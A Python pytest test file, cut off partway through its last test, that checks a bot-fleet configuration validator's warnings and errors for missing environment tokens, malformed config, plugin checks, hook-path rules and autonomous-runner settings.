"""Tests for validator.py — validate() with missing env vars and library refs."""

from __future__ import annotations

import json
import os
import re
from pathlib import Path

import pytest

from claudlobby import validator as validator_module
from claudlobby.config import load_fleet
from claudlobby.known_values import _AUTO_ELIGIBLE_RENAMES
from claudlobby.paths import Paths
from claudlobby.validator import _grant_wellformed, validate


def _make_paths(root: Path) -> Paths:
    return Paths(root=root, fleet_dir=None)


class TestValidate:
    def test_valid_fleet_no_errors(self, fleet_dir, monkeypatch):
        monkeypatch.setenv("GITHUB_PAT", "ghp_test123")
        monkeypatch.setenv("TELEGRAM_TOKEN_LEAD", "123:abc")
        monkeypatch.setenv("TELEGRAM_TOKEN_WORKER1", "456:def")
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert not report.has_errors

    def test_missing_expertise_is_error(self, fleet_dir, monkeypatch):
        # Overwrite fleet.yaml with a bot referencing nonexistent expertise
        yaml_text = (fleet_dir / "fleet.yaml").read_text()
        yaml_text = yaml_text.replace("orchestration", "nonexistent-role")
        (fleet_dir / "fleet.yaml").write_text(yaml_text)

        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert report.has_errors
        assert any("nonexistent-role" in e for e in report.errors)

    def test_malformed_library_frontmatter_is_error(self, fleet_dir, monkeypatch):
        monkeypatch.setenv("GITHUB_PAT", "ghp_test123")
        monkeypatch.setenv("TELEGRAM_TOKEN_LEAD", "123:abc")
        monkeypatch.setenv("TELEGRAM_TOKEN_WORKER1", "456:def")
        bad = fleet_dir / "library" / "guardrails" / "bad-frontmatter.md"
        bad.parent.mkdir(parents=True, exist_ok=True)
        # description value opens with a backtick — a YAML reserved indicator (#791)
        bad.write_text("---\ndescription: `x` is bad yaml\n---\n\nBody.\n")
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert report.has_errors
        assert any(
            "malformed frontmatter" in e and "bad-frontmatter.md" in e
            for e in report.errors
        )

    def test_missing_env_var_is_warning(self, fleet_dir, monkeypatch):
        # Ensure GITHUB_PAT is NOT set
        monkeypatch.delenv("GITHUB_PAT", raising=False)
        monkeypatch.delenv("TELEGRAM_TOKEN_LEAD", raising=False)
        monkeypatch.delenv("TELEGRAM_TOKEN_WORKER1", raising=False)

        # Give the lead bot the github MCP so it needs GITHUB_PAT
        yaml_text = (fleet_dir / "fleet.yaml").read_text()
        yaml_text = yaml_text.replace(
            "expertise: [orchestration]",
            "expertise: [orchestration]\n      mcp: [github]",
        )
        (fleet_dir / "fleet.yaml").write_text(yaml_text)

        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert any("GITHUB_PAT" in w for w in report.warnings)

    def test_empty_mcp_env_var_is_warning(self, fleet_dir, monkeypatch):
        # Value-based (#755): an MCP contract var scaffolded as an empty stub
        # (present but "") must still warn — MCP vars ARE auto-scaffolded, so a
        # presence check goes permanently silent after the first cold generate.
        monkeypatch.setenv("GITHUB_PAT", "")
        monkeypatch.setenv("TELEGRAM_TOKEN_LEAD", "123:abc")
        monkeypatch.setenv("TELEGRAM_TOKEN_WORKER1", "456:def")
        yaml_text = (fleet_dir / "fleet.yaml").read_text()
        yaml_text = yaml_text.replace(
            "expertise: [orchestration]",
            "expertise: [orchestration]\n      mcp: [github]",
        )
        (fleet_dir / "fleet.yaml").write_text(yaml_text)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert any("GITHUB_PAT" in w for w in report.warnings)

    def test_env_has_value_is_value_based(self):
        # The shared predicate behind all three "requires VAR but it's not set"
        # warnings (MCP / tool / token_env): absent AND empty both count as
        # unset; a real value (even "0") counts as set (#755).
        ev = validator_module._env_has_value
        assert ev({}, "X") is False
        assert ev({"X": ""}, "X") is False
        assert ev({"X": "v"}, "X") is True
        assert ev({"X": "0"}, "X") is True

    def test_empty_tool_env_var_is_warning(self, fleet_dir, monkeypatch):
        # #755 helper backs the tool env-contract warning too (validator.py:378).
        # A tool declaring `env: [TOOLTOKEN]` with the var present-but-empty warns.
        from textwrap import dedent

        from claudlobby.config import ToolEntry

        monkeypatch.setenv("GITHUB_PAT", "ghp_test")
        monkeypatch.setenv("TELEGRAM_TOKEN_LEAD", "123:abc")
        monkeypatch.setenv("TELEGRAM_TOKEN_WORKER1", "456:def")
        monkeypatch.setenv("TOOLTOKEN", "")
        tool_dir = fleet_dir / "library" / "tools" / "envtool"
        tool_dir.mkdir(parents=True)
        (tool_dir / "tool.yaml").write_text(
            dedent(
                """\
                type: script
                env: [TOOLTOKEN]
                """
            )
        )
        (tool_dir / "envtool.py.j2").write_text("X = 1\n")
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        fleet.bots["lead"].tools = [ToolEntry(name="envtool")]
        report = validate(fleet, _make_paths(fleet_dir))
        assert any("TOOLTOKEN" in w for w in report.warnings)

    def test_missing_telegram_token_is_warning(self, fleet_dir, monkeypatch):
        monkeypatch.delenv("TELEGRAM_TOKEN_LEAD", raising=False)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert any("TELEGRAM_TOKEN_LEAD" in w for w in report.warnings)

    def test_empty_telegram_token_is_warning(self, fleet_dir, monkeypatch):
        # Value-based, not presence-based (#755): a scaffolded-but-empty token_env
        # (key present, value "") must still warn — else the nudge fires once then
        # goes permanently silent even though the operator never filled it in.
        monkeypatch.setenv("TELEGRAM_TOKEN_LEAD", "")
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert any("TELEGRAM_TOKEN_LEAD" in w for w in report.warnings)

    def test_unreadable_integration_skips_with_warning(self, fleet_dir, caplog):
        # Give lead bot an explicit integration so validator walks it
        yaml_text = (fleet_dir / "fleet.yaml").read_text()
        yaml_text = yaml_text.replace(
            "expertise: [orchestration]",
            "expertise: [orchestration]\n      integrations: [github]",
        )
        (fleet_dir / "fleet.yaml").write_text(yaml_text)

        # Make the integration file unreadable
        int_file = fleet_dir / "library" / "integrations" / "github.md"
        int_file.chmod(0o000)

        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        paths = _make_paths(fleet_dir)
        # Must not crash — OSError is caught
        report = validate(fleet, paths)
        assert not report.has_errors

        # Restore permissions for cleanup
        int_file.chmod(0o644)

        # Verify the warning was emitted via logging
        assert "skipping" in caplog.text

    def test_empty_bots_is_error(self, fleet_dir):
        (fleet_dir / "fleet.yaml").write_text("fleet:\n  name: empty\n  bots: {}\n")
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert report.has_errors
        assert any("empty" in e for e in report.errors)

    def test_reports_to_invalid_ref_is_warning(self, fleet_dir, monkeypatch):
        monkeypatch.setenv("TELEGRAM_TOKEN_LEAD", "123:abc")
        monkeypatch.setenv("TELEGRAM_TOKEN_WORKER1", "456:def")
        yaml_text = (fleet_dir / "fleet.yaml").read_text()
        yaml_text = yaml_text.replace(
            "expertise: [software-engineering]",
            "expertise: [software-engineering]\n      reports_to: nonexistent-bot",
        )
        (fleet_dir / "fleet.yaml").write_text(yaml_text)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert any(
            "reports_to" in w and "nonexistent-bot" in w for w in report.warnings
        )

    def test_manages_invalid_ref_is_warning(self, fleet_dir, monkeypatch):
        monkeypatch.setenv("TELEGRAM_TOKEN_LEAD", "123:abc")
        monkeypatch.setenv("TELEGRAM_TOKEN_WORKER1", "456:def")
        yaml_text = (fleet_dir / "fleet.yaml").read_text()
        yaml_text = yaml_text.replace(
            "expertise: [orchestration]",
            "expertise: [orchestration]\n      manages: [worker-1, ghost-bot]",
        )
        (fleet_dir / "fleet.yaml").write_text(yaml_text)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert any("manages" in w and "ghost-bot" in w for w in report.warnings)
        # worker-1 exists, so no warning for it
        assert not any("manages" in w and "worker-1" in w for w in report.warnings)

    def test_tools_deny_conflicts_with_expertise(self, fleet_dir, monkeypatch):
        monkeypatch.setenv("TELEGRAM_TOKEN_WORKER1", "456:def")
        yaml_text = (fleet_dir / "fleet.yaml").read_text()
        yaml_text = yaml_text.replace(
            "expertise: [software-engineering]",
            "expertise: [software-engineering]\n      tool_permissions:\n        deny: [Write, Edit]",
        )
        (fleet_dir / "fleet.yaml").write_text(yaml_text)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert any(
            "tools.deny" in w and "software-engineering" in w for w in report.warnings
        )

    def test_tools_deny_no_conflict_for_reviewer(self, fleet_dir, monkeypatch):
        monkeypatch.setenv("TELEGRAM_TOKEN_LEAD", "123:abc")
        monkeypatch.setenv("TELEGRAM_TOKEN_WORKER1", "456:def")
        monkeypatch.setenv("GITHUB_PAT", "ghp_test123")
        # Add code-review expertise file
        (fleet_dir / "library" / "expertise" / "code-review.md").write_text(
            "# Reviewer\n\nReview PRs.\n"
        )
        yaml_text = (fleet_dir / "fleet.yaml").read_text()
        yaml_text = yaml_text.replace(
            "expertise: [software-engineering]",
            "expertise: [code-review]\n      tool_permissions:\n        deny: [Write, Edit]",
        )
        (fleet_dir / "fleet.yaml").write_text(yaml_text)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        # code-review has no core tools that conflict with Write/Edit deny
        assert not any("tools.deny" in w for w in report.warnings)

    def test_tools_allow_deny_overlap_warns(self, fleet_dir, monkeypatch):
        monkeypatch.setenv("TELEGRAM_TOKEN_WORKER1", "456:def")
        yaml_text = (fleet_dir / "fleet.yaml").read_text()
        yaml_text = yaml_text.replace(
            "expertise: [software-engineering]",
            "expertise: [software-engineering]\n      tool_permissions:\n        deny: [Write]\n        allow: [Write, Read]",
        )
        (fleet_dir / "fleet.yaml").write_text(yaml_text)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert any("both allow and deny" in w for w in report.warnings)


class TestBenchValidation:
    """bench: true marker — multi-bot fleets should designate one."""

    def _env_patch(self, monkeypatch):
        monkeypatch.setenv("GITHUB_PAT", "ghp_test")
        monkeypatch.setenv("TELEGRAM_TOKEN_LEAD", "123:abc")
        monkeypatch.setenv("TELEGRAM_TOKEN_WORKER1", "456:def")

    def test_multi_bot_no_bench_warns(self, fleet_dir, monkeypatch):
        """Multiple bots with no bench: true → warning."""
        self._env_patch(monkeypatch)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert any("bench: true" in w for w in report.warnings)

    def test_multi_bot_with_bench_no_warn(self, fleet_dir, monkeypatch):
        """Multiple bots with one bench: true → no warning."""
        self._env_patch(monkeypatch)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        fleet.bots["lead"].bench = True
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert not any("bench: true" in w for w in report.warnings)

    def test_single_bot_no_bench_no_warn(self, fleet_dir, monkeypatch):
        """Single-bot fleet without bench: true → no warning."""
        self._env_patch(monkeypatch)
        from textwrap import dedent

        (fleet_dir / "fleet.yaml").write_text(
            dedent("""\
            fleet:
              name: solo
              service_prefix: com.test
              bots:
                solo:
                  expertise: [orchestration]
        """)
        )
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert not any("bench: true" in w for w in report.warnings)


class TestPluginValidation:
    """_validate_fleet warns about missing plugins and validates format."""

    def _env_patch(self, monkeypatch):
        monkeypatch.setenv("GITHUB_PAT", "ghp_test")
        monkeypatch.setenv("TELEGRAM_TOKEN_LEAD", "123:abc")
        monkeypatch.setenv("TELEGRAM_TOKEN_WORKER1", "456:def")

    def _fake_installed(self, tmp_path, monkeypatch, plugins_dict):
        import json

        fake_home = tmp_path / "fakehome"
        plugins_dir = fake_home / ".claude" / "plugins"
        plugins_dir.mkdir(parents=True)
        (plugins_dir / "installed_plugins.json").write_text(
            json.dumps({"plugins": plugins_dict})
        )
        monkeypatch.setenv("HOME", str(fake_home))

    def test_defaults_validated_even_without_plugins_section(
        self, fleet_dir, monkeypatch, tmp_path
    ):
        """No plugins: section in yaml → defaults still apply and get validated."""
        self._env_patch(monkeypatch)
        self._fake_installed(
            tmp_path, monkeypatch, {"claudna@Claudfather": {"version": "0.2.0"}}
        )
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        # Default plugins present but installed → no warnings about missing
        assert not any(
            "claudna@Claudfather" in w and "not installed" in w for w in report.warnings
        )

    def test_include_defaults_false_no_plugin_warnings(
        self, fleet_dir, monkeypatch, tmp_path
    ):
        """include_defaults: false + no additional → no install warnings, but does warn about disabling."""
        self._env_patch(monkeypatch)
        fake_home = tmp_path / "fakehome"
        fake_home.mkdir()
        monkeypatch.setenv("HOME", str(fake_home))
        from claudlobby.config import PluginsConfig

        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        fleet.plugins = PluginsConfig(required=[], include_defaults=False)
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert any("include_defaults is false" in w for w in report.warnings)
        assert not any("not installed" in w for w in report.warnings)

    def test_validate_warns_missing_manifest(self, fleet_dir, monkeypatch, tmp_path):
        """Plugins declared but installed_plugins.json doesn't exist."""
        self._env_patch(monkeypatch)
        fake_home = tmp_path / "fakehome"
        fake_home.mkdir()
        monkeypatch.setenv("HOME", str(fake_home))
        from claudlobby.config import PluginsConfig

        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        fleet.plugins = PluginsConfig(required=["claudna@Claudfather"])
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert any("installed_plugins.json" in w for w in report.warnings)

    def test_validate_warns_missing_plugin(self, fleet_dir, monkeypatch, tmp_path):
        """Plugin declared but not in installed_plugins.json."""
        self._env_patch(monkeypatch)
        self._fake_installed(
            tmp_path, monkeypatch, {"telegram@claude-plugins-official": {}}
        )
        from claudlobby.config import PluginsConfig

        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        fleet.plugins = PluginsConfig(
            required=["claudna@Claudfather", "telegram@claude-plugins-official"]
        )
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert any(
            "claudna@Claudfather" in w and "not installed" in w for w in report.warnings
        )
        assert not any(
            "telegram@claude-plugins-official" in w and "not installed" in w
            for w in report.warnings
        )

    def test_validate_no_warn_installed_plugin(self, fleet_dir, monkeypatch, tmp_path):
        """Plugin declared and present in installed_plugins.json → no warning."""
        self._env_patch(monkeypatch)
        self._fake_installed(
            tmp_path, monkeypatch, {"claudna@Claudfather": {"version": "0.2.0"}}
        )
        from claudlobby.config import PluginsConfig

        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        fleet.plugins = PluginsConfig(required=["claudna@Claudfather"])
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert not any(
            "claudna@Claudfather" in w and "not installed" in w for w in report.warnings
        )

    def test_validate_warns_bad_plugin_format(self, fleet_dir, monkeypatch, tmp_path):
        """Plugin name not matching name@marketplace gets a warning."""
        self._env_patch(monkeypatch)
        self._fake_installed(tmp_path, monkeypatch, {})
        from claudlobby.config import PluginsConfig

        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        fleet.plugins = PluginsConfig(required=["bad-no-at-sign"])
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert any("name@marketplace format" in w for w in report.warnings)

    def test_validate_warns_bad_marketplace_repo(
        self, fleet_dir, monkeypatch, tmp_path
    ):
        """Marketplace repo not matching org/repo gets a warning."""
        self._env_patch(monkeypatch)
        self._fake_installed(tmp_path, monkeypatch, {})
        from claudlobby.config import PluginsConfig

        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        fleet.plugins = PluginsConfig(
            required=[],
            marketplaces={
                "Bad": {"source": {"source": "github", "repo": "noslash"}},
            },
        )
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert any("<org>/<repo> format" in w for w in report.warnings)


class TestObservabilityValidation:
    """Observability config range validation."""

    def _env_patch(self, monkeypatch):
        monkeypatch.setenv("GITHUB_PAT", "ghp_test")
        monkeypatch.setenv("TELEGRAM_TOKEN_LEAD", "123:abc")
        monkeypatch.setenv("TELEGRAM_TOKEN_WORKER1", "456:def")

    def test_default_observability_no_warnings(self, fleet_dir, monkeypatch):
        self._env_patch(monkeypatch)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        fleet.bots["lead"].bench = True
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert not any("observability" in w for w in report.warnings)

    def test_pulse_interval_zero_warns(self, fleet_dir, monkeypatch):
        self._env_patch(monkeypatch)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        fleet.bots["lead"].observability.pulse_interval = 0
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert any(
            "pulse_interval must be > 0" in w and "lead" in w for w in report.warnings
        )

    def test_pulse_interval_over_3600_warns(self, fleet_dir, monkeypatch):
        self._env_patch(monkeypatch)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        fleet.bots["worker-1"].observability.pulse_interval = 7200
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert any(
            "pulse_interval > 3600" in w and "worker-1" in w for w in report.warnings
        )

    def test_a_retired_observability_key_is_disclosed_not_ignored(self, fleet_dir, monkeypatch):
        """`observability.reap_days` has no reader since the F18 closure
        (#1467): a manifest that still sets it loads, and validate SAYS so,
        naming the key — a config field nothing reads must not be swallowed
        (test_reap_days_zero_warns / test_reap_days_over_365_warns went with the
        knob: there is no range to check on a key nothing reads)."""
        self._env_patch(monkeypatch)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        fleet.bots["lead"].observability.retired = ("reap_days",)
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert any(
            "observability.reap_days has no reader since the F18 closure" in w and "lead" in w
            for w in report.warnings
        )
        assert not any("reap_days" in w and "worker-1" in w for w in report.warnings)

    def test_bridge_heal_max_attempts_out_of_range_warns(self, fleet_dir, monkeypatch):
        self._env_patch(monkeypatch)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        fleet.bots["worker-1"].observability.bridge_heal_max_attempts = 11
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert any(
            "bridge_heal_max_attempts" in w and "worker-1" in w for w in report.warnings
        )

    def test_bridge_heal_valid_no_warn(self, fleet_dir, monkeypatch):
        self._env_patch(monkeypatch)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        fleet.bots["worker-1"].observability.bridge_heal = True
        fleet.bots["worker-1"].observability.bridge_heal_max_attempts = 3
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert not any("bridge_heal" in w for w in report.warnings)


class TestHookCommandSourceGuard:
    """Absolute hook commands under the #702 L1 source guard.

    The old soft existence check (warn when an absolute command file is missing)
    is dropped — provenance replaces existence (G14). An absolute hook command is
    now a hard error whether or not the file exists; it must anchor on a composer
    path or be declared. hooks[].command is a word-split field, so an embedded
    absolute is caught too.
    """

    def _env_patch(self, monkeypatch):
        monkeypatch.setenv("GITHUB_PAT", "ghp_test")
        monkeypatch.setenv("TELEGRAM_TOKEN_LEAD", "123:abc")
        monkeypatch.setenv("TELEGRAM_TOKEN_WORKER1", "456:def")

    def test_absolute_command_errors_and_existence_check_is_gone(
        self, fleet_dir, monkeypatch
    ):
        self._env_patch(monkeypatch)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        fleet.bots["lead"].hooks = {
            "PreToolUse": [{"command": "/nonexistent/path/hook.sh"}],
        }
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        # Now a hard ERROR (source guard), not a warning.
        assert any("/nonexistent/path/hook.sh" in e for e in report.errors)
        # The dropped existence check no longer emits its 'not found on disk' warn.
        assert not any("not found on disk" in w for w in report.warnings)

    def test_existing_absolute_command_still_errors(self, fleet_dir, monkeypatch):
        # /bin/true exists — but existence no longer excuses an absolute (G14).
        self._env_patch(monkeypatch)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        fleet.bots["lead"].hooks = {"PreToolUse": [{"command": "/bin/true"}]}
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert any("/bin/true" in e for e in report.errors)

    def test_relative_command_is_clean(self, fleet_dir, monkeypatch):
        """Relative commands (like 'log.sh') are not paths — neither warned nor errored."""
        self._env_patch(monkeypatch)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        fleet.bots["lead"].hooks = {
            "PostToolUse": [{"command": "log.sh", "matcher": "Bash"}],
        }
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert not any("log.sh" in e for e in report.errors)
        assert not any("log.sh" in w for w in report.warnings)

    def test_anchored_command_is_clean(self, fleet_dir, monkeypatch):
        self._env_patch(monkeypatch)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        fleet.bots["lead"].hooks = {
            "PreToolUse": [{"command": "${CLAUDLOBBY_ROOT}/lib/hook.sh"}],
        }
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert not any("hook.sh" in e for e in report.errors)

    def test_prompt_type_hook_has_no_command_to_check(self, fleet_dir, monkeypatch):
        """Hooks with type: prompt carry no command — their keys are exempt."""
        self._env_patch(monkeypatch)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        fleet.bots["lead"].hooks = {
            "PreToolUse": [{"type": "prompt", "prompt": "Is this safe?"}],
        }
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert not any("Is this safe" in e for e in report.errors)


class TestCrossFleetCollisions:
    """Cross-fleet bot-name collision detection."""

    def _env_patch(self, monkeypatch):
        monkeypatch.setenv("GITHUB_PAT", "ghp_test")
        monkeypatch.setenv("TELEGRAM_TOKEN_LEAD", "123:abc")
        monkeypatch.setenv("TELEGRAM_TOKEN_WORKER1", "456:def")

    def test_collision_detected(self, fleet_dir, monkeypatch):
        """Bot name existing in another fleet's runtime triggers a warning."""
        self._env_patch(monkeypatch)
        # Set up an overlay fleet structure
        my_fleet = fleet_dir / "local" / "my-fleet"
        my_fleet.mkdir(parents=True)
        (my_fleet / "fleet.yaml").write_text((fleet_dir / "fleet.yaml").read_text())

        # Create another fleet with a colliding bot name ('lead')
        other_bots = fleet_dir / "local" / "other-fleet" / "runtime" / "bots" / "lead"
        other_bots.mkdir(parents=True)
        (other_bots / "bot.conf").write_text("BOT_NAME=lead\n")

        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        paths = Paths(root=fleet_dir, fleet_dir=my_fleet)
        report = validate(fleet, paths)
        assert any(
            "lead" in w and "other-fleet" in w and "collide" in w
            for w in report.warnings
        )

    def test_no_collision_when_names_differ(self, fleet_dir, monkeypatch):
        """Bot names unique across fleets produce no collision warning."""
        self._env_patch(monkeypatch)
        my_fleet = fleet_dir / "local" / "my-fleet"
        my_fleet.mkdir(parents=True)

        other_bots = (
            fleet_dir / "local" / "other-fleet" / "runtime" / "bots" / "unique-bot"
        )
        other_bots.mkdir(parents=True)
        (other_bots / "bot.conf").write_text("BOT_NAME=unique-bot\n")

        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        paths = Paths(root=fleet_dir, fleet_dir=my_fleet)
        report = validate(fleet, paths)
        assert not any("collide" in w for w in report.warnings)

    def test_no_collision_with_own_fleet(self, fleet_dir, monkeypatch):
        """Bots in the current fleet's own runtime dir don't trigger collision."""
        self._env_patch(monkeypatch)
        my_fleet = fleet_dir / "local" / "my-fleet"
        own_bots = my_fleet / "runtime" / "bots" / "lead"
        own_bots.mkdir(parents=True)
        (own_bots / "bot.conf").write_text("BOT_NAME=lead\n")

        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        paths = Paths(root=fleet_dir, fleet_dir=my_fleet)
        report = validate(fleet, paths)
        assert not any("collide" in w for w in report.warnings)

    def test_no_local_dir_no_crash(self, fleet_dir, monkeypatch):
        """No local/ directory at all — should not crash."""
        self._env_patch(monkeypatch)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        paths = Paths(root=fleet_dir, fleet_dir=None)
        report = validate(fleet, paths)
        assert not any("collide" in w for w in report.warnings)


class TestAutonomousRunnerValidation:
    """Validation of the per-bot autonomous_runner block."""

    def _env_patch(self, monkeypatch):
        monkeypatch.setenv("GITHUB_PAT", "ghp_test")
        monkeypatch.setenv("TELEGRAM_TOKEN_LEAD", "123:abc")
        monkeypatch.setenv("TELEGRAM_TOKEN_WORKER1", "456:def")

    def _attach(self, fleet, **kwargs):
        from claudlobby.config import (
            AutonomousRunnerBypass,
            AutonomousRunnerConfig,
            AutonomousRunnerPicker,
        )

        defaults = dict(
            skill="/claudna:audit tech-debt", cadence="1h", target_repo="org/repo"
        )
        defaults.update(kwargs)
        picker = defaults.pop("picker", None)
        bypass = defaults.pop("bypass", None)
        fleet.bots["lead"].autonomous_runner = AutonomousRunnerConfig(
            **defaults,
            picker=AutonomousRunnerPicker(**picker) if picker else None,
            bypass=AutonomousRunnerBypass(**bypass) if bypass else None,
        )

    def _auto_eligible_warned(self, report):
        return any(
            "autonomous_runner.skill" in w and "--auto-eligible" in w
            for w in report.warnings
        )

    def test_known_skill_no_warning(self, fleet_dir, monkeypatch):
        self._env_patch(monkeypatch)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        self._attach(fleet)
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        # The live default form (/claudna:audit tech-debt) is eligible — no
        # --auto-eligible warning. (Both dead and live strings contain
        # "tech-debt", so match on the warning phrase, not the token.)
        assert not self._auto_eligible_warned(report)

    def test_unknown_skill_warns(self, fleet_dir, monkeypatch):
        self._env_patch(monkeypatch)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        self._attach(fleet, skill="/claudna:nonexistent")
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert self._auto_eligible_warned(report)

    @pytest.mark.parametrize("dead,live", list(_AUTO_ELIGIBLE_RENAMES.items()))
    def test_consolidation_rename_inversion(self, fleet_dir, monkeypatch, dead, live):
        # The dead -> live rename must validate one way only: the live
        # (consolidated space-form) is eligible, the dead (pre-consolidation
        # hyphen-name) is not. Locks the inversion shut for every rename.
        self._env_patch(monkeypatch)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        paths = _make_paths(fleet_dir)

        self._attach(fleet, skill=live)
        report = validate(fleet, paths)
        assert not self._auto_eligible_warned(report)

        self._attach(fleet, skill=dead)
        report = validate(fleet, paths)
        assert self._auto_eligible_warned(report)

    def test_bad_cadence_warns(self, fleet_dir, monkeypatch):
        self._env_patch(monkeypatch)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        self._attach(fleet, cadence="banana")
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert any("cadence" in w and "banana" in w for w in report.warnings)

    def test_bad_target_repo_warns(self, fleet_dir, monkeypatch):
        self._env_patch(monkeypatch)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        self._attach(fleet, target_repo="just-a-name")
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert any("target_repo" in w and "org/repo" in w for w in report.warnings)

    def test_github_issues_picker_without_label_is_error(self, fleet_dir, monkeypatch):
        self._env_patch(monkeypatch)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        self._attach(fleet, picker={"type": "github_issues", "label": None})
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert any("picker.label is required" in e for e in report.errors)

    def test_unknown_on_bypass_warns(self, fleet_dir, monkeypatch):
        self._env_patch(monkeypatch)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        self._attach(fleet, bypass={"on_bypass": "explode"})
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert any("on_bypass" in w and "explode" in w for w in report.warnings)

    def test_unknown_on_outcome_key_warns(self, fleet_dir, monkeypatch):
        self._env_patch(monkeypatch)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        self._attach(fleet, on_outcome={"banana": "report"})
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert any("on_outcome key" in w and "banana" in w for w in report.warnings)

    def test_unknown_on_outcome_action_warns(self, fleet_dir, monkeypatch):
        self._env_patch(monkeypatch)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        self._attach(fleet, on_outcome={"completed": "explode"})
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert any("on_outcome action" in w and "explode" in w for w in report.warnings)

    def test_non_claudna_hook_warns(self, fleet_dir, monkeypatch):
        self._env_patch(monkeypatch)
        fleet, _md = load_fleet(fleet_dir / "fleet.yaml")
        self._attach(fleet, pre_hooks=["random-skill"])
        paths = _make_paths(fleet_dir)
        report = validate(fleet, paths)
        assert any(
            "autonomous_runner hook" in w and "random-skill" in w
            for w in report.warnings
        )

    def test_no_autonomous_runner_no_warnings(self, fleet_dir, monkeypatch):
